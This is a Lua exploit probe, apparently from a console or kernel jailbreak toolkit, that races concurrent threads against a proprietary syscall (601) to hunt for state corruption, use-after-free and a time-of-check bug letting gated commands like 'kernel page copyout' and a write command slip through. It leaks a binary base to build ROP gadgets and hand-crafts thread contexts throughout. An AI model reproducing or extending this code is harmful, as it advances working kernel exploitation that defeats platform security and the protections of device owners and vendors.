-- CRASH_CLASS: HIGH
-- PROBE 103a: sys 601 state machine race
--
-- sys 601 is a per-process state machine with 12+ commands that allocate
-- kernel memory (42-48 vmd per call). Commands 0x07/0x09/0x0B/0x0D/0x13/
-- 0x14/0x19/0x1D/0x20 store input arg in output (read-back). Commands
-- 0x01/0x02/0x05/0x06/0x0A/0x10/0x12 are gated (return -1).
--
-- This probe races two threads calling sys 601 concurrently to test:
--   A: Cross-contamination — thread A sees thread B's value or vice versa
--   B: Init-gate TOCTOU — rapid init while gated cmd tries to slip through
--   C: High-frequency concurrent init — corrupt internal allocation state
--
-- If state machine lacks per-thread locking → potential corruption/UAF

print("=== PROBE 103a: SYS 601 STATE MACHINE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

-- Eboot base for gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc601=mk(601)

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- Allocate region: 4 shared pages + N child slots (2 stack + 1 ctx each)
local SLOTS=4
local STK_PG=2; local PG_PER=STK_PG+1
local TOTAL_PG=4+SLOTS*PG_PER
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X slots=%d", R, SLOTS))

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl20=R+0x20; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local sl100=R+0x40; wq(sl100,uint64(0)); wq(sl100+8,uint64(100000000))
local sl500=R+0x60; wq(sl500,uint64(0)); wq(sl500+8,uint64(500000000))
local tb=R+0x80

-- Result/exit tracking
local RESULT_BASE=R+0x1000
local EXIT_BASE=R+0x1100
local COUNTER_BASE=R+0x1200

local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end
local function result_addr(i) return RESULT_BASE+i*8 end
local function exit_addr(i) return EXIT_BASE+i*8 end
local function counter_addr(i) return COUNTER_BASE+i*8 end

-- Shared output buffer for sys 601 (children will write to different offsets)
local BUF601=memory.alloc(0x200)

local function setup_ctx(slot, rax, rdi, rsi, rdx, r10, r8)
    local ctx=child_ctx(slot)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(child_stk(slot)))
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi))
    wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx or 0))
    wq(ctx+_R10,uint64(r10 or 0))
    wq(ctx+_R8,uint64(r8 or 0))
end

local function spawn_child(slot, stk_chain)
    local stk=child_stk(slot)
    local off=0
    for _,v in ipairs(stk_chain) do
        wq(stk+off, v); off=off+8
    end
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx(slot)), uint64(tb), uint64(0)) end)
    return rq(tb)
end

-- ============================================================
print("")
print("--- A: CROSS-CONTAMINATION (2 threads, different values) ---")
-- Thread 0: repeatedly calls 601(cmd=0x07, arg=0xAAAAAAAA, buf_A)
-- Thread 1: repeatedly calls 601(cmd=0x09, arg=0xBBBBBBBB, buf_B)
-- After running, check if buf_A ever has 0xBBBBBBBB or buf_B has 0xAAAAAAAA

-- Each thread does N iterations of: 601(cmd, arg_val, buf_addr)
-- sys 601 ABI: 601(cmd, arg, buf, bufsize)
-- We use the Atomic_fetch_add gadget to count iterations

-- For this test, we'll have each child do sys 601 in a loop using the stack
-- chain pattern. But the child can only execute a single syscall per spawn.
-- So we spawn many children in succession.

local buf_A=memory.alloc(0x200); z(buf_A,0x200)
local buf_B=memory.alloc(0x200); z(buf_B,0x200)
local ROUNDS=50
local contam=0

local vm_a0=vmc()
for round=1,ROUNDS do
    -- Spawn thread 0: 601(0x07, 0xAAAAAAAA, buf_A, 0x200)
    setup_ctx(0, 601, 0x07, 0xAAAAAAAA, N(buf_A), 0x200, 0)
    spawn_child(0, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- Spawn thread 1: 601(0x09, 0xBBBBBBBB, buf_B, 0x200)
    setup_ctx(1, 601, 0x09, 0xBBBBBBBB, N(buf_B), 0x200, 0)
    spawn_child(1, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- Brief sleep for threads to execute
    native.fcall_with_rax(stub,240,N(sl20),0)

    -- Check for cross-contamination
    local a_val=rd(buf_A)
    local b_val=rd(buf_B)
    if a_val==0xBBBBBBBB or b_val==0xAAAAAAAA then
        contam=contam+1
        print(string.format("  !!CONTAMINATION round=%d a=0x%X b=0x%X",
            round, a_val or 0, b_val or 0))
    end

    -- Also check for unexpected values (not 0xAAAAAAAA, 0xBBBBBBBB, or 0)
    if a_val~=0 and a_val~=0xAAAAAAAA and a_val~=0xBBBBBBBB then
        print(string.format("  !!CORRUPT A round=%d val=0x%X", round, a_val))
        contam=contam+1
    end
    if b_val~=0 and b_val~=0xBBBBBBBB and b_val~=0xAAAAAAAA then
        print(string.format("  !!CORRUPT B round=%d val=0x%X", round, b_val))
        contam=contam+1
    end

    -- Reset buffers
    wd(buf_A, 0); wd(buf_B, 0)

    -- Status every 25 rounds
    if round%25==0 then
        local c=N(native.fcall_with_rax(stub,20))
        print(string.format("  A[%d]: contam=%d pid=%d%s",
            round, contam, c, c~=pid and " !!CANARY" or ""))
        if c~=pid then break end
    end
end
local vm_a1=vmc()
print(string.format("A done: contam=%d vm=%d->%d d=%d",
    contam, vm_a0, vm_a1, vm_a1-vm_a0))

-- ============================================================
print("")
print("--- B: INIT-GATE TOCTOU (init vs gated cmd) ---")
-- Thread 0: rapidly calls 601(0x00, 0, buf) — init command
-- Thread 1: rapidly calls 601(0x10, 0, buf2) — gated "kernel page copyout"
-- If the gate opens during init, 0x10 might succeed (rv=0 instead of -1)

local buf_init=memory.alloc(0x200)
local buf_gate=memory.alloc(0x200)
local gate_opened=0

local vm_b0=vmc()
for round=1,ROUNDS do
    z(buf_init,0x200); z(buf_gate,0x200)

    -- Spawn init thread
    setup_ctx(0, 601, 0x00, 0, N(buf_init), 0x200, 0)
    spawn_child(0, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- Spawn gated cmd thread (0x10 = "kernel page copyout")
    setup_ctx(1, 601, 0x10, 0, N(buf_gate), 0x200, 0)
    spawn_child(1, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })

    -- Brief sleep
    native.fcall_with_rax(stub,240,N(sl20),0)

    -- Check if gate command succeeded (non-zero output or unexpected values)
    local g_val=rd(buf_gate)
    if g_val~=nil and g_val~=0 then
        gate_opened=gate_opened+1
        print(string.format("  !!GATE OPENED round=%d buf_gate[0]=0x%X",
            round, g_val))
        -- Dump first 32 bytes if non-zero
        local dump=""
        for off=0,28,4 do
            local v=rd(buf_gate+off)
            if v and v~=0 then dump=dump..string.format(" +%02X=%X",off,v) end
        end
        if dump~="" then print("    data:"..dump) end
    end

    -- Also try gated cmds 0x12 (write) and 0x02
    z(buf_gate,0x200)
    setup_ctx(2, 601, 0x12, 0x41414141, N(buf_gate), 0x200, 0)
    spawn_child(2, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })
    native.fcall_with_rax(stub,240,N(sl20),0)

    local g2=rd(buf_gate)
    if g2~=nil and g2~=0 then
        gate_opened=gate_opened+1
        print(string.format("  !!GATE 0x12 round=%d buf=0x%X", round, g2))
    end

    if round%25==0 then
        local c=N(native.fcall_with_rax(stub,20))
        print(string.format("  B[%d]: gate=%d pid=%d%s",
            round, gate_opened, c, c~=pid and " !!CANARY" or ""))
        if c~=pid then break end
    end
end
local vm_b1=vmc()
print(string.format("B done: gate_opened=%d vm=%d->%d d=%d",
    gate_opened, vm_b0, vm_b1, vm_b1-vm_b0))

-- ============================================================
print("")
print("--- C: HIGH-FREQ CONCURRENT INIT (allocation stress) ---")
-- 3 threads all rapidly call 601(0x00, 0, buf) simultaneously
-- Each init allocates ~42 vmd. Concurrent inits may corrupt allocator state.

local buf_c={}
for i=0,2 do buf_c[i]=memory.alloc(0x200) end

local vm_c0=vmc()
for round=1,30 do
    for i=0,2 do z(buf_c[i],0x200) end

    -- Spawn 3 init threads simultaneously
    for i=0,2 do
        setup_ctx(i, 601, 0x00, round, N(buf_c[i]), 0x200, 0)
        spawn_child(i, {
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
    end

    native.fcall_with_rax(stub,240,N(sl20),0)

    -- Check outputs
    local vals=""
    for i=0,2 do
        local v=rd(buf_c[i])
        if v and v~=0x100 and v~=0 then
            vals=vals..string.format(" [%d]=0x%X",i,v)
        end
    end
    if vals~="" then
        print(string.format("  !!UNEXPECTED round=%d%s", round, vals))
    end

    if round%15==0 then
        local c=N(native.fcall_with_rax(stub,20))
        print(string.format("  C[%d]: pid=%d%s",
            round, c, c~=pid and " !!CANARY" or ""))
        if c~=pid then break end
    end
end
local vm_c1=vmc()
print(string.format("C done: vm=%d->%d d=%d", vm_c0, vm_c1, vm_c1-vm_c0))

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s contam=%d gate=%d vm_total=%d",
    fc==pid and "OK" or "!!FAIL="..fc, contam, gate_opened, vmc()-vm_a0))
print(string.format("SUMMARY: A(cross-contam)=%d B(gate-toctou)=%d",
    contam, gate_opened))
print("=== 103a COMPLETE ===")
